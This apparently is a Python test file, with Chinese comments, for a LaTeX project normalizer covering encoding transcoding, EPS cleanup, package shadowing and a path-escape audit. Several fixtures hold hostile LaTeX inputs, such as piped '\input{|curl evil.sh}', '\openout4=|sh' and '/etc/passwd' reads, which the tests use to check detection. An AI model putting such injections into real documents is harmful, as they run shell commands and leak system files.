"""normalize_project 工程级集成面——转码分档 / PS 族净化 / junk stub / kpse 遮蔽 / rebase / 越界审计。

纯文本手术单测在 test_compile_normalize.py；.bbl 复用粒度在
test_compile_bbl.py（docs/spec/translate.md §3.1 树级手术链逐条对应）。
"""

from pathlib import Path

import pytest

from texlate import textutil
from texlate.compile import shadow
from texlate.compile.normalize import (
    normalize_project,
    rebase_project_paths,
    source_path_violations,
)


# 9. OT1/T1 → TU（project 级）
def test_legacy_latin_fonts(tmp_path: Path) -> None:
    tex = (
        "\\documentclass{article}\n"
        "\\begin{document}\n"
        "{\\fontfamily{ptm}\\selectfont hello}\n"
        "\\end{document}\n"
    )
    (tmp_path / "main.tex").write_text(tex)
    normalize_project(tmp_path, "xelatex")
    out = (tmp_path / "main.tex").read_text()
    assert "texlate-ptm" in out
    assert "NFSSFamily=texlate-ptm" in out
    assert "texgyretermes-regular.otf" in out


def test_legacy_latin_fonts_no_dangling_rewrite(tmp_path: Path) -> None:
    r"""``\documentclass`` 无 ``{...}`` 实参的文件进不了注入循环——

    若仍计入 documents 集，``\usefont`` 改写成 ``texlate-ptm`` 而定义块
    无处注入即悬空引用。判定正则与注入定位同形后此类文件不计入，
    documents 空则整体不改写。
    """
    (tmp_path / "main.tex").write_text(
        "\\documentclass\n\\begin{document}\n"
        "\\usefont{OT1}{ptm}{m}{n} hello\n\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    out = (tmp_path / "main.tex").read_text()
    assert "texlate-ptm" not in out
    assert "\\usefont{OT1}{ptm}" in out
    assert "legacy_latin_files" not in stats


# 12. rebase 越界路径
def test_rebase_project_paths(tmp_path: Path) -> None:
    """根层主文件 `\\input{../shared/x}`（越界）→ 包内 `shared/x` 存在则改写。"""
    (tmp_path / "main.tex").write_text("\\input{../shared/macros.tex}\n")
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "macros.tex").write_text("% macros\n")
    locs = rebase_project_paths(tmp_path, "main.tex")
    assert locs
    out = (tmp_path / "main.tex").read_text()
    assert "\\input{shared/macros.tex}" in out
    assert "../" not in out


def test_source_path_violations_absolute(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{/etc/passwd}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_escape_outside(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{../../outside.tex}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_pipe(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{|curl evil.sh}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_openio_cs_form(tmp_path: Path) -> None:
    r"""`\openout\w=|cmd` / `\openin\r=/abs` —— `\cs=` 形态的真文件名要过检查。"""
    (tmp_path / "main.tex").write_text(
        "\\openout\\w=|curl evil.sh\n"
        "\\openin\\r=/etc/passwd\n"
        "\\openout\\w = ../../outside\n"
        "\\openout4=|sh\n"
    )
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert {v[0].name for v in violations} == {"main.tex"}
    assert [v[1].group(0) for v in violations] == [
        "\\openout\\w=|curl",
        "\\openin\\r=/etc/passwd",
        "\\openout\\w = ../../outside",
        "\\openout4=|sh",
    ]


def test_source_path_violations_openio_legit_noop(tmp_path: Path) -> None:
    r"""合法包内 `\openout\w=out.dat` 不误报。"""
    (tmp_path / "main.tex").write_text("\\openout\\w=out.dat\n\\openin\\r=refs.bib\n")
    assert list(source_path_violations(tmp_path, "main.tex")) == []


# ---------------------------------------------------------------- 编码分档接线
def test_normalize_project_records_encoding_verdict(tmp_path: Path) -> None:
    """非 UTF-8 主文件：转码写回 + ``stats["encodings"]`` 归因可回溯。"""
    main = tmp_path / "main.tex"
    blob = b"\\documentclass{article}\n\\begin{document}\nQu\xe9bec\n\\end{document}\n"
    main.write_bytes(blob)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    encs = stats["encodings"]
    assert encs["main.tex"]["basis"] == "detector"
    assert encs["main.tex"]["encoding"] in {"cp1252", "latin-1", "mac_roman"}
    assert "Québec" in main.read_text(encoding="utf-8")
    # utf-8 写回后再次 normalize 不再记 detector（幂等）
    stats2 = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats2.get("encodings", {}).get("main.tex", {}).get("basis") != "detector"


def test_normalize_project_transcodes_aux(tmp_path: Path) -> None:
    """.bib/.bbl 不过手术但须转码——``transcoded_aux`` 单列。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    bib = tmp_path / "refs.bib"
    bib.write_bytes(b"@article{a, author={Andr\xe9}}\n")
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "refs.bib" in stats["transcoded_aux"]
    assert bib.read_bytes().decode("utf-8").find("é") > 0
    assert stats["encodings"]["refs.bib"]["encoding"] != "utf-8"


def test_normalize_project_clean_utf8_no_encodings(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "encodings" not in stats
    assert "transcoded_aux" not in stats


def test_normalize_project_junk_stub(tmp_path: Path) -> None:
    r"""bundled aipcheck.tex 覆写为 ``\endinput`` stub（1109.2354 交互自检件）。"""
    (tmp_path / "aipcheck.tex").write_text(
        "\\newif\\ifproblem\n\\typein{* Type <return> to continue ...}\n"
        "\\def\\next#1/#2/#3\\next{#1#2}\n"
    )
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\input{aipcheck}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    stub = (tmp_path / "aipcheck.tex").read_text()
    assert stub.endswith("\\endinput\n")
    assert "typein" not in stub.lower()
    assert stats["junk_stubbed"] == ["aipcheck.tex"]
    # 覆写不删——\input 目标存在性保留；其它文件内容不动
    assert "\\input{aipcheck}" in (tmp_path / "main.tex").read_text()


def test_normalize_project_junk_stub_nested(tmp_path: Path) -> None:
    """名单件逐名匹配不限深度；幂等——二次 normalize 不再记 junk。"""
    sub = tmp_path / "vendor" / "aip"
    sub.mkdir(parents=True)
    (sub / "aipcheck.tex").write_text("\\typein{press return}\n")
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["junk_stubbed"] == ["vendor/aip/aipcheck.tex"]
    stats2 = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "junk_stubbed" not in stats2


def test_normalize_project_junk_name_collision(tmp_path: Path) -> None:
    """名撞护栏：同名但无垃圾签名的真件不覆写；带签名件仍 stub。"""
    real = "\\section{Results}\nreal paper body, not the AIP check file\n"
    (tmp_path / "aipcheck.tex").write_text(real)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\input{aipcheck}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "junk_stubbed" not in stats
    assert (tmp_path / "aipcheck.tex").read_text() == real


def test_normalize_project_junk_collision_mixed(tmp_path: Path) -> None:
    """同树垃圾件 + 撞名真件并存：签名件 stub、真件放行（逐件判别）。"""
    real = "\\section{Results}\nreal fragment\n"
    sub = tmp_path / "vendor"
    sub.mkdir()
    (sub / "aipcheck.tex").write_text(
        "% $Id: aipcheck.tex,v 1.9 2005/12/01 16:16:27 frank Exp $\n"
        "\\typein{press return}\n"
    )
    (tmp_path / "aipcheck.tex").write_text(real)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["junk_stubbed"] == ["vendor/aipcheck.tex"]
    assert (tmp_path / "aipcheck.tex").read_text() == real


# ---------------------------------------------------------------- invalid_utf8 输入侧臂
def test_sanitize_ps_comments_header_bad_byte(tmp_path: Path) -> None:
    """EPS 头注释 latin-1/GBK 字节 → UTF-8 净化；diff 仅限注释行。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%Title: (C:\\wuga\\\xd7\xc0\xc3\xe6\\fig.eps)\n"
        b"%%BoundingBox: 0 0 100 100\n"
        b"%%EndComments\nshowpage\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "fig.eps" in stats["sanitized_ps_comments"]
    new = eps.read_bytes()
    new.decode("utf-8")  # 不再抛
    old_lines, new_lines = blob.split(b"\n"), new.split(b"\n")
    assert len(old_lines) == len(new_lines)  # 行数不变
    assert sum(a != b for a, b in zip(old_lines, new_lines, strict=True)) == 1


def test_sanitize_ps_comments_crlf_preserved(tmp_path: Path) -> None:
    r"""CRLF 件坏注释行净化后行尾 ``\r`` 保留——``decode_tex`` 的 EOL 归一
    曾把 ``\r`` 改写成 ``\n``，join 后凭空多出空行。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\r\n"
        b"%%Title: caf\xe9 fig\r\n"
        b"%%EndComments\r\n"
        b"100 200 moveto\r\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "fig.eps" in stats["sanitized_ps_comments"]
    new = eps.read_bytes()
    assert new == (
        b"%!PS-Adobe-3.0 EPSF-3.0\r\n"
        b"%%Title: caf\xc3\xa9 fig\r\n"
        b"%%EndComments\r\n"
        b"100 200 moveto\r\n"
    )


def test_sanitize_ps_comments_preserves_binary_section(tmp_path: Path) -> None:
    """非注释行的坏字节（PS 字符串/数据区）原样保留——字节即语义。"""
    blob = b"%!PS-Adobe-3.0 EPSF-3.0\n%%BoundingBox: 0 0 10 10\n(caf\xe9) show\n%%EOF\n"
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "sanitized_ps_comments" not in stats
    assert eps.read_bytes() == blob  # 逐字节不变


def test_sanitize_ps_comments_dos_header_untouched(tmp_path: Path) -> None:
    """DOS-EPS 二进制头（0xC5D0D3C6）含绝对偏移——整件跳过。"""
    blob = b"\xc5\xd0\xd3\xc6" + b"\x00" * 24 + b"%!PS\n%%Title: bad\xe9\n"
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    normalize_project(tmp_path, "xelatex", "main.tex")
    assert eps.read_bytes() == blob


def test_atend_bbox_header_rewritten(tmp_path: Path) -> None:
    """``(atend)`` 占位头行改写为 trailer 实值——扫描在头行即停，数据行坏字节不再入扫。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"(=8.2\xd710) show\n"  # latin-1 × 数据行——字节即语义不动
        b"%%Trailer\n"
        b"%%BoundingBox: 74 87 587 383\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["resolved_atend_bbox"] == ["fig.eps"]
    new = eps.read_bytes()
    new_lines, old_lines = new.split(b"\n"), blob.split(b"\n")
    assert len(new_lines) == len(old_lines)
    assert new_lines[1] == b"%%BoundingBox: 74 87 587 383"
    # 改写仅限头行——数据行/trailer 行逐字节不动
    assert sum(a != b for a, b in zip(old_lines, new_lines, strict=True)) == 1
    assert new_lines[3] == b"(=8.2\xd710) show"
    assert b"%%Trailer\n%%BoundingBox: 74 87 587 383" in new


def test_atend_bbox_no_trailer_value_untouched(tmp_path: Path) -> None:
    """无 trailer 实值行——不可造值，整件原样。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"(bad\xe9) show\n"
        b"%%Trailer\n%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_malformed_trailer_untouched(tmp_path: Path) -> None:
    """trailer 行值畸形（非 4 数值）——不造值，整件原样。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"%%Trailer\n"
        b"%%BoundingBox: none\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_real_header_untouched(tmp_path: Path) -> None:
    """头行已实值（无 atend 占位）——不改写。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: 0 0 100 100\n"
        b"%%EndComments\n(bad\xe9) show\n%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_body_atend_not_header_untouched(tmp_path: Path) -> None:
    """``(atend)`` 出现在头注释块之外（body/trailer）——不认作头占位，不改写。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%EndComments\n"
        b"showpage\n"
        b"%%Trailer\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in stats
    assert eps.read_bytes() == blob


def test_atend_bbox_idempotent(tmp_path: Path) -> None:
    """二次 normalize_project 输出逐字节一致——头行已是实值无占位可命中。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%EndComments\n"
        b"(bad\xe9) show\n"
        b"%%Trailer\n"
        b"%%BoundingBox: 10 20 30 40\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    first = normalize_project(tmp_path, "xelatex", "main.tex")
    assert first["resolved_atend_bbox"] == ["fig.eps"]
    once = eps.read_bytes()
    second = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "resolved_atend_bbox" not in second
    assert eps.read_bytes() == once


def test_atend_bbox_combined_with_comment_sanitize(tmp_path: Path) -> None:
    """atend 改写 + 注释行坏字节净化同发——两台账各记各的。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%BoundingBox: (atend)\n"
        b"%%For: caf\xe9\n"
        b"%%EndComments\n"
        b"(bad\xe9) show\n"
        b"%%Trailer\n"
        b"%%BoundingBox: 1 2 3 4\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["resolved_atend_bbox"] == ["fig.eps"]
    assert stats["sanitized_ps_comments"] == ["fig.eps"]
    new = eps.read_bytes()
    assert new.split(b"\n")[1] == b"%%BoundingBox: 1 2 3 4"
    assert b"%%For: caf\xc3\xa9" in new  # 注释行坏字节已转 UTF-8
    assert b"(bad\xe9) show" in new  # 数据行原样


def test_transcode_catchall_data_file(tmp_path: Path) -> None:
    """未列名文本件（.txt/.dtx/无后缀）catch-all 转码。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    data = tmp_path / "notes.txt"
    data.write_bytes("André\n".encode("cp1252"))
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "notes.txt" in stats["transcoded_data"]
    assert "André" in data.read_text(encoding="utf-8")


def test_transcode_catchall_binary_untouched(tmp_path: Path) -> None:
    """二进制 allowlist 件（.png/.jpg/.pdf）坏字节原样保留。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    blob = b"\x89PNG\r\n\x1a\n" + bytes(range(256))
    png = tmp_path / "fig.png"
    png.write_bytes(blob)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "transcoded_data" not in stats
    assert png.read_bytes() == blob


def test_shadow_broken_system_package(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """工程引用的系统包带坏字节 → 净化副本落 main 目录遮蔽。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"  # 须在工程 root 外——root 内件由主循环转码
    proj.mkdir()
    sysdir.mkdir()
    bad = sysdir / "oldpkg.sty"
    bad.write_bytes(b"%% Copyright Schr\xf6der\n\\ProvidesPackage{oldpkg}\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    _pin_kpse(monkeypatch, {"oldpkg.sty": bad})
    stats = normalize_project(proj, "xelatex", "main.tex")
    shadows = stats["package_shadows"]
    assert shadows[0]["package"] == "oldpkg.sty"
    copied = proj / "oldpkg.sty"
    assert "Schröder" in copied.read_text(encoding="utf-8")
    # 幂等：再跑不再遮蔽（遮蔽件已在 root 内解析命中）
    stats2 = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats2


def test_shadow_clean_system_package_noop(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """系统件本身合法 UTF-8 → 不写遮蔽。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    proj.mkdir()
    sysdir.mkdir()
    good = sysdir / "goodpkg.sty"
    good.write_bytes(b"%% clean\n\\ProvidesPackage{goodpkg}\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{goodpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    _pin_kpse(monkeypatch, default=good)
    stats = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    assert not (proj / "goodpkg.sty").exists()


def test_shadow_resolved_inside_root_noop(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """工程自带同名包（kpsewhich 命中 root 内）→ 不遮蔽自身。"""
    own = tmp_path / "mypkg.sty"
    own.write_bytes(b"%% mine latin \xe9\n")  # 工程内件由主循环转码
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{mypkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    _pin_kpse(monkeypatch, default=own)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    own.read_bytes().decode("utf-8")  # 且主循环已把工程件转码


def test_shadow_vendored_same_name_in_subdir_skipped(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """工程子目录 vendored 同名件 → 即便 kpsewhich 解析到坏系统件也不遮蔽。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    (proj / "sty").mkdir(parents=True)
    sysdir.mkdir()
    (proj / "sty" / "oldpkg.sty").write_bytes(b"%% vendored\n")
    bad = sysdir / "oldpkg.sty"
    bad.write_bytes(b"%% Copyright Schr\xf6der\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    _pin_kpse(monkeypatch, {"oldpkg.sty": bad})
    stats = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    assert not (proj / "oldpkg.sty").exists()


def test_sanitize_ps_comments_beginbinary_section_untouched(tmp_path: Path) -> None:
    """``%%BeginBinary`` 段内 % 行是字节负载不是注释——逐字节保留。"""
    blob = (
        b"%!PS-Adobe-3.0 EPSF-3.0\n"
        b"%%Title: caf\xe9\n"
        b"%%BoundingBox: 0 0 10 10\n"
        b"%%BeginBinary: 8\n"
        b"%BIN\xe9ARY\n"
        b"%%EndBinary\n"
        b"%%EOF\n"
    )
    eps = tmp_path / "fig.eps"
    eps.write_bytes(blob)
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "fig.eps" in stats["sanitized_ps_comments"]  # 头注释 %%Title 净化
    new = eps.read_bytes()
    assert b"%%Title: caf\xc3\xa9" in new
    assert b"%BIN\xe9ARY" in new  # 数据段原样


def test_symlinked_tex_not_written_through(tmp_path: Path) -> None:
    """工程树内软链 .tex → 跳过手术，写穿会改到 root 外目标。"""
    outside = tmp_path.parent / f"{tmp_path.name}-ext.tex"
    outside.write_bytes(b"\\pdfcompresslevel=9\n")
    try:
        (tmp_path / "linked.tex").symlink_to(outside)
        (tmp_path / "main.tex").write_text(
            "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
        )
        stats = normalize_project(tmp_path, "xelatex", "main.tex")
        assert outside.read_bytes() == b"\\pdfcompresslevel=9\n"
        assert stats["files"] == 1  # 只统计 main.tex，软链不进手术面
    finally:
        outside.unlink(missing_ok=True)


def test_junk_stub_symlink_not_stubbed_through(tmp_path: Path) -> None:
    """软链命名的 aipcheck.tex 不覆写（写穿 = 改 root 外文件）。"""
    outside = tmp_path.parent / f"{tmp_path.name}-aip.tex"
    outside.write_bytes(b"\\typein{press}\n")
    try:
        (tmp_path / "aipcheck.tex").symlink_to(outside)
        (tmp_path / "main.tex").write_text(
            "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
        )
        stats = normalize_project(tmp_path, "xelatex", "main.tex")
        assert "junk_stubbed" not in stats
        assert outside.read_bytes() == b"\\typein{press}\n"
    finally:
        outside.unlink(missing_ok=True)


def test_shadow_dangling_symlink_target_skipped(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """遮蔽目标位已有悬挂软链 → 不写（exists()=False 但 write_text 会写穿）。"""
    proj = tmp_path / "proj"
    sysdir = tmp_path / "sys"
    proj.mkdir()
    sysdir.mkdir()
    bad = sysdir / "oldpkg.sty"
    bad.write_bytes(b"%% Copyright Schr\xf6der\n\\ProvidesPackage{oldpkg}\n")
    (proj / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{oldpkg}\n"
        "\\begin{document}\nx\\end{document}\n"
    )
    (proj / "oldpkg.sty").symlink_to(tmp_path / "nowhere.sty")  # 悬挂
    _pin_kpse(monkeypatch, {"oldpkg.sty": bad})
    stats = normalize_project(proj, "xelatex", "main.tex")
    assert "package_shadows" not in stats
    assert (proj / "oldpkg.sty").is_symlink()  # 未被覆写
    assert not (tmp_path / "nowhere.sty").exists()


def test_transcode_catchall_nul_binary_untouched(tmp_path: Path) -> None:
    """allowlist 漏网二进制（NUL 且非 UTF-16）→ 不动且不进 encodings 归因。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    blob = b"\x00\x01\x02\xffBINARY\x00DATA"
    data = tmp_path / "payload.bin"
    data.write_bytes(blob)
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "transcoded_data" not in stats
    assert "payload.bin" not in stats.get("encodings", {})
    assert data.read_bytes() == blob


def test_transcode_extensionless_utf16_transcoded(tmp_path: Path) -> None:
    """无后缀 UTF-16（NUL 占比高但 utf-16 判定先行）→ 仍转码 UTF-8。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\\end{document}\n"
    )
    notes = tmp_path / "NOTES"
    notes.write_bytes("chécklist\n".encode("utf-16-le"))
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "NOTES" in stats["transcoded_data"]
    assert notes.read_text(encoding="utf-8") == "chécklist\n"


def test_normalize_engine_support_file_keeps_primitives(tmp_path: Path) -> None:
    r"""1306.0294：bundled hpdftex.def 的 ``\pdfinfo``/``\pdfoutput`` 是实现内容——支持件不删。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}\n",
        encoding="utf-8",
    )
    drv = (
        "\\def\\PDF@FinishDoc{%\n  \\pdfinfo{%\n    /Author(\\@pdfauthor)%\n  }%\n}\n"
        "\\pdfoutput=1\n"
    )
    (tmp_path / "hpdftex.def").write_text(drv, encoding="utf-8")
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    assert stats["files"] == 2  # noqa: PLR2004 -- main + hpdftex.def
    assert (tmp_path / "hpdftex.def").read_text(encoding="utf-8") == drv


def test_normalize_engine_support_still_rewrites_driver(tmp_path: Path) -> None:
    r"""支持件仍吃驱动 token 改写——bundled .sty 的 ``[pdftex]`` 装载期语义要修。"""
    sty = (
        "\\ProvidesPackage{mymacros}\n"
        "\\RequirePackage[pdftex]{graphicx}\n"
        "\\usepackage[dvips]{color}\n"
    )
    (tmp_path / "mymacros.sty").write_text(sty, encoding="utf-8")
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}\n",
        encoding="utf-8",
    )
    normalize_project(tmp_path, "xelatex", "main.tex")
    out = (tmp_path / "mymacros.sty").read_text(encoding="utf-8")
    assert "pdftex]{graphicx}" not in out
    assert "xetex]{graphicx}" in out
    assert "xetex]{color}" in out


# ---------------------------------------------------------------- bundled 样式件转码 + PS 族扩面
def test_bundled_style_files_recoded(tmp_path: Path) -> None:
    r"""bundled .sty/.cls/.def 非 UTF-8 → 主循环转码 UTF-8 + ``encodings`` 归因。

    字节形态取真实件：algorithm.sty L11 ``Rog\xe9rio Brito``、
    algorithm2e.sty L284 ``Schr\xf6der``/L550 ``J\xf6rg``（loop1
    invalid_utf8 归因的注释行 latin-1 签名）。
    """
    (tmp_path / "main.tex").write_text(
        "\\documentclass{mycls}\n\\usepackage{mypkg}\n"
        "\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    (tmp_path / "mypkg.sty").write_bytes(
        b"%% Copyright (C) 2005-2009   Rog\xe9rio Brito <rbrito@ime.usp.br>\n"
        b"\\ProvidesPackage{mypkg}\n\\newcommand\\x{}\n"
    )
    (tmp_path / "mycls.cls").write_bytes(
        b"% thanks to Martin Schr\xf6der\n\\LoadClass{article}\n"
    )
    (tmp_path / "mydrv.def").write_bytes(b"% port by J\xf6rg\n\\def\\mydrv{}\n")
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    for name, needle in (
        ("mypkg.sty", "Rogério Brito"),
        ("mycls.cls", "Schröder"),
        ("mydrv.def", "Jörg"),
    ):
        assert needle in (tmp_path / name).read_text(encoding="utf-8")
        assert stats["encodings"][name]["basis"] != "strict-utf8"
    # 行数保留——编译错误可回溯源行号
    assert len((tmp_path / "mypkg.sty").read_text().splitlines()) == 3  # noqa: PLR2004


def test_bundled_style_recode_idempotent(tmp_path: Path) -> None:
    """转码后重跑：样式件已 strict-utf8——encodings 不再记、字节逐位不动。"""
    (tmp_path / "main.tex").write_text(
        "\\documentclass{article}\n\\usepackage{mypkg}\n"
        "\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    (tmp_path / "mypkg.sty").write_bytes(
        b"%% Copyright Schr\xf6der\n\\ProvidesPackage{mypkg}\n"
    )
    first = normalize_project(tmp_path, "xelatex", "main.tex")
    assert first["encodings"]["mypkg.sty"]["basis"] != "strict-utf8"
    once = (tmp_path / "mypkg.sty").read_bytes()
    second = normalize_project(tmp_path, "xelatex", "main.tex")
    assert "mypkg.sty" not in second.get("encodings", {})
    assert (tmp_path / "mypkg.sty").read_bytes() == once


def test_bundled_style_clean_utf8_untouched(tmp_path: Path) -> None:
    """已是 UTF-8 的 .sty/.cls/.def 不重写——stats 无 rewritten 之外痕迹。"""
    blobs = {
        "ok.sty": "%% clean utf-8 — em\n\\ProvidesPackage{ok}\n",
        "ok.cls": "%% class\n\\LoadClass{article}\n",
        "ok.def": "%% driver\n\\def\\ok{}\n",
    }
    for name, text in blobs.items():
        # win32 write_text 默认 \n→\r\n——"已是干净件"夹具须字节精确
        (tmp_path / name).write_text(text, encoding="utf-8", newline="")
    (tmp_path / "main.tex").write_text(
        "\\documentclass{ok}\n\\usepackage{ok}\n\\begin{document}\nx\\end{document}\n",
        encoding="utf-8",
    )
    stats = normalize_project(tmp_path, "xelatex", "main.tex")
    for name, text in blobs.items():
        assert (tmp_path / name).read_bytes() == text.encode("utf-8")
        assert name not in stats.get("encodings", {})


def test_epsi_routed_to_ps_comment_sanitize(tmp_path: Path) -> None:
